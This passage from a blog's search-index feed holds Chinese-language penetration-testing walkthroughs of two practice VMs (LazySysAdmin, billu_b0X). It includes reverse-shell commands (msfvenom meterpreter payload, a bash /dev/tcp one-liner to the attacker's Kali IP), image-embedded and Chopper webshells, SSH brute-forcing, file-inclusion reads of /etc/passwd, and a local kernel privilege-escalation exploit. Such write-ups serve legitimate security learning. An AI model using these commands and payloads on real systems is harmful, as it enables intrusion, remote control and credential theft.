src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223946613.png" alt="image-20210131223946613"></p><p>分别登录到之前找到的phpmyadmin页面和wordpress后台管理页面</p><p>phpmyadmin很明显是没给权限，这里查不了数据表</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131222828646.png" alt="image-20210131222828646"></p><p>再登录下后台试试，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223001074.png" alt="image-20210131223001074"></p><p>进到后台之后挨个页面查看，可以看到一个页面可以修改部分页面代码，如下图，我们可以看到一个404.php，点进去看一下</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223240722.png" alt="image-20210131223240722"></p><p>看了这个页面内容后，这是一个显示访问页面不存在的一个跳转页面，我们测试一下猜想，在/wordpress路径下随便提交个不存在的参数</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223710635.png" alt="image-20210131223710635"></p><p>可以看到，上下两图的回显内容是一样的，是此页面对应的源码没错</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131223637610.png" alt="image-20210131223637610"></p><p>既然这里可以修改源码，那我们可以在这里换上我们的代码，反弹一个shell回来</p><p>先用msf制作一个反弹shell的php木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.1.137 <span class="hljs-attribute">lport</span>=4444 -f<span class="hljs-built_in"> raw </span>&gt; 1.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210113200422878.png" alt="image-20210113200422878"></p><p>生成木马如下图，ip地址为kali的ip，端口号4444为kali要监听的端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210113200652237.png" alt="image-20210113200652237"></p><p>我们把这个代码内容粘贴到之前的那个404.php里</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224448320.png" alt="image-20210131224448320"></p><p>点击update更新</p><p>然后在kali端监听端口</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224649182.png" alt="image-20210131224649182"></p><p>再次刷新之前那个显示notfound的页面，反弹成功，查看下信息，无误</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131224904654.png" alt="image-20210131224904654"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>提权用到了之前的那个deets.txt里提到的密码12345，以及/wordpress路径下主页面反复提到的my name is togie(讲实话这个地方一串这个有点吓人)</p><p>言归正传，是在参考了网上其他writeup后发现了这个密码12345和togie的联系和用处(文章末尾附参考链接)，首先我们利用已经获取到的shell，在获取一个交互shell，以使用su命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131225911932.png" alt="image-20210131225911932"></p><p>当我们转换到togie用户后会惊喜的发现，他可以直接转root用户，至此提权完毕，整个渗透过程也已经完成了</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131230343421.png" alt="image-20210131230343421"></p><p>提权过程出乎意料的短，整个靶机的渗透过程相对其他靶机也显得稍有些简单，但一切简单全都源于后台放了一个含密码的deets.txt文件在网站wordpress根目录下，此处提到推出服务器后，记得删除该文件，并及时更新密码，但管理员并没有这样做，这也就是lazysysadmin的含义了吧，也是我们平时很容易犯的错误。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131230650845.png" alt="image-20210131230650845"></p><h4 id="其他思路："><a href="#其他思路：" class="headerlink" title="其他思路："></a>其他思路：</h4><p>其实刚刚进到wordpress路径下的时候看到那个togie用户名就可以尝试ssh爆破一下的，后来我们看到的那个密码12345强度也相当弱，用网上找的到的大多数字典也都可以爆破的出</p><p>依旧是用msf，用ssh的爆破模块，这里用户名和密码的字典是分开的，用户名的字典里我自己添加了togie这个用户名</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231448491.png" alt="image-20210131231448491"></p><p>很快就能爆破的出用户名密码 togie:12345</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231923661.png" alt="image-20210131231923661"></p><p>ssh连接</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131231823832.png" alt="image-20210131231823832"></p><p>切换root用户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210131232113083.png" alt="image-20210131232113083"></p><p>文章参考：</p><p><a href="https://zhuanlan.zhihu.com/p/114916169">https://zhuanlan.zhihu.com/p/114916169</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶机练习-1：billu_b0X</title>
    <link href="/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/"/>
    <url>/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/</url>
    
    <content type="html"><![CDATA[<h2 id="靶机练习-1：billu-b0X"><a href="#靶机练习-1：billu-b0X" class="headerlink" title="靶机练习-1：billu_b0X"></a>靶机练习-1：billu_b0X</h2><h4 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h4><p>Billu_b0x，VMware虚拟机设置为nat模式，靶机自动获取ip地址</p><p>kali linux 2020虚拟机，ip地址192.168.1.137</p><h4 id="渗透步骤："><a href="#渗透步骤：" class="headerlink" title="渗透步骤："></a>渗透步骤：</h4><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><h6 id="1-ip发现"><a href="#1-ip发现" class="headerlink" title="1.ip发现"></a>1.ip发现</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>使用nmap扫描本网段主机，其中192.168.1.1为网卡地址，192.168.1.3为网关，137为本机地址，</p><p>目标靶机ip为192.168.1.132</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_box%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0.png" alt="image-20201231224509510"></p><p>或者使用命令arp-scan -l扫描，效果相同，且不扫描本机</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231224634344.png" alt="image-20201231224634344"></p><h6 id="2-端口及服务扫描"><a href="#2-端口及服务扫描" class="headerlink" title="2.端口及服务扫描"></a>2.端口及服务扫描</h6><p>使用nmap进行端口和服务扫描，指定1-65535全端口，并添加参数A做服务识别和深度扫描，生成结果文件a.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.132</span> -<span class="hljs-literal">oN</span> a.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0X%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="image-20201231224915291"></p><p>从上图中可以看到，靶机是一台ubuntu，开启http服务，访问上去看一下</p><p>show me your sqli skills:让展示一下注入技巧，sqlmap测试未果，再看看其他的目录</p><p>[<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%E4%B8%BB%E9%A1%B5.png" alt="DKKlKx.png">]</p><h6 id="3-目录及页面扫描"><a href="#3-目录及页面扫描" class="headerlink" title="3.目录及页面扫描"></a>3.目录及页面扫描</h6><p>用kali的dirb跑一下目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%20dirb%E6%89%AB%E6%8F%8F.png" alt="image-20201231225713412">+</p><p>同时windows用御剑跑一下，可以得到更多的爆破结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230127563.png" alt="image-20201231230127563"></p><p>得到页面较多，test.php、add.php、in.php、c.php、index.php、show.php等，目录有：uploaded_images，phpmy，依次访问</p><h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><h6 id="1-访问test-php：页面提示file参数为空，需要提供file参数"><a href="#1-访问test-php：页面提示file参数为空，需要提供file参数" class="headerlink" title="1.访问test.php：页面提示file参数为空，需要提供file参数"></a>1.访问test.php：页面提示file参数为空，需要提供file参数</h6><p>测试一下文件下载，不行，会跳转回首页</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230819189.png" alt="image-20201231230819189"></p><h6 id="2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"><a href="#2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载" class="headerlink" title="2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"></a>2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载</h6><p>成功，获得passwd文件，这里用burp改包也行，但是要麻烦一些，就直接hackbar了。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231532879.png" alt="image-20201231231532879"></p><h6 id="3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。"><a href="#3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。" class="headerlink" title="3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。"></a>3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231649579.png" alt="image-20201231231649579"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232504441.png" alt="image-20201231232504441"></p><ol start="4"><li><h6 id="查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root"><a href="#查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root" class="headerlink" title="查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root"></a>查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root</h6></li></ol><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232027735.png" alt="image-20201231232027735"></p><p>访问add.php、in.php页面和审计代码</p><p>add.php是一个上传界面，但是功能无法使用，查看源码文件发现只是个页面，没有后台处理代码。in.php是php info信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232247255.png" alt="image-20201231232247255"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232539359.png" alt="image-20201231232539359"></p><h6 id="5-查看c-php源码"><a href="#5-查看c-php源码" class="headerlink" title="5.查看c.php源码"></a>5.查看c.php源码</h6><p>这是个数据库连接文件，人家直接写了mysql连接用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232908417.png" alt="image-20201231232908417"></p><h6 id="6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面"><a href="#6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面" class="headerlink" title="6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面"></a>6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233502816.png" alt="image-20201231233502816"></p><p>用刚刚在c.php看到的用户名：billu，密码：b0x_billu登录，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233707322.png" alt="image-20201231233707322"></p><p>在ica_lab数据库的auth表中，找到web登录的用户名：biLLu，密码：hEx_it</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233638955.png" alt="image-20201231233638955"></p><h6 id="7-回index-php，登进去"><a href="#7-回index-php，登进去" class="headerlink" title="7.回index.php，登进去"></a>7.回index.php，登进去</h6><p>进来以后看到一个账号管理界面，里面已经有了两个账户，杰克船长和巴博萨船长</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234202943.png" alt="image-20201231234202943"></p><p>两个账号的头像图片地址，在之前已经暴破出来：uploaded_images，登上去，下载一张图片jack.jpg出来，里面有些乱七八糟的东西，是我第一遍做的时候传上去的，不管它们，不影响接着做</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234443183.png" alt="image-20201231234443183"></p><h6 id="7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"><a href="#7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。" class="headerlink" title="7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"></a>7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。</h6><p>查看之前test文件包含获得的panel.php源码，发现panel.php存在本地文件包含漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101103835037.png" alt="image-20210101103835037"></p><p>用文本编辑器打开刚刚下载下来的图片，在文件末尾加一条命令，生成图片马</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101104540102.png" alt="image-20210101104540102"></p><p>把这张图片上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111249263.png" alt="image-20210101111249263"></p><p>测试一下图片马能否正常使用，点击continue，用burp抓包，使用burp执行命令：</p><p>post请求url中加入执行命令的参数：POST /panel.php?cmd=cat%20/etc/passwd;ls</p><p>post的body中包含cmd.jpg图片马：load=/uploaded_images/3.jpg&amp;continue=continue</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111519306.png" alt="image-20210101111519306"></p><p>可以看到测试没有问题，命令成功被执行</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111627588.png" alt="image-20210101111627588"></p><h6 id="8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash"><a href="#8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash" class="headerlink" title="8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash"></a>8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash</h6><p>需要先将命令url编码：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101120048156.png" alt="image-20210101120048156"></p><p>在post的url中加入编码好的命令</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125246031.png" alt="image-20210101125246031"></p><p>在发送前，先在命令行nc监听，以便接受反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101113430892.png" alt="image-20210101113430892"></p><p>点击发送，接收成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125854351.png" alt="image-20210101125854351"></p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><h6 id="1-提权准备工作"><a href="#1-提权准备工作" class="headerlink" title="1.提权准备工作"></a>1.提权准备工作</h6><p>这里需要找一个有写权限的目录，先前我们上传图片的那个目录/uploaded_images，很显然就有写权限，不然也没法往里面上传图片，我们在这个目录下写一个菜刀马，一会方便用菜刀连接传输文件</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130935950.png" alt="image-20210101130935950"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130908414.png" alt="image-20210101130908414"></p><p>菜刀连接一下，如图连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101131453390.png" alt="image-20210101131453390"></p><h6 id="2-提升权限"><a href="#2-提升权限" class="headerlink" title="2.提升权限"></a>2.提升权限</h6><p>查看系统内核，命令uanme -a和cat /etc/issue</p><p>可以看到详细的系统信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132344836.png" alt="image-20210101132344836"></p><p>这里可以使用一个著名的ubuntu本地提权exp，<a href="https://www.exploit-db.com/exploits/37292%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5">https://www.exploit-db.com/exploits/37292，这个链接可以下载下来</a></p><p>下载后把这个文件用菜刀放到/uploaded_images目录下</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132746285.png" alt="image-20210101132746285"></p><p>然后赋予这个文件权限</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132913066.png" alt="image-20210101132913066"></p><p>编译exp</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132958470.png" alt="image-20210101132958470"></p><p>然后运行即可提权</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101133102180.png" alt="image-20210101133102180"></p><p>查看是否生效，如图，提权成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101135446041.png" alt="image-20210101135446041"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在爆破完目录后注意要尽量利用test.php下载所有可下载的页面源码，以提高发现漏洞的可能；在登录phpmyadmin和拿到普通用户密码登录index.php时，要注意区分大小写；在上传图片马成功准备制作反弹shell时，尽量不要耽搁时间，页面会话时间较短，很容易会话过期，在利用图片马时，发送至repeater模块的请求是带有cookie的，若页面会话过期注意重新登录后更换请求，不然带着过期的cookie进行请求会一直接收不到反弹shell（被这个折磨了很久，一开始一直找不到原因）</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test-blog</title>
    <link href="/2021/04/27/test-blog/"/>
    <url>/2021/04/27/test-blog/</url>
    
    <content type="html"><![CDATA[<p>你好，这是一个测试博客</p><p><a href="https://imgtu.com/i/gCFQXQ"><img src="https://z3.ax1x.com/2021/04/27/gCFQXQ.jpg" alt="gCFQXQ.jpg"></a></p>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
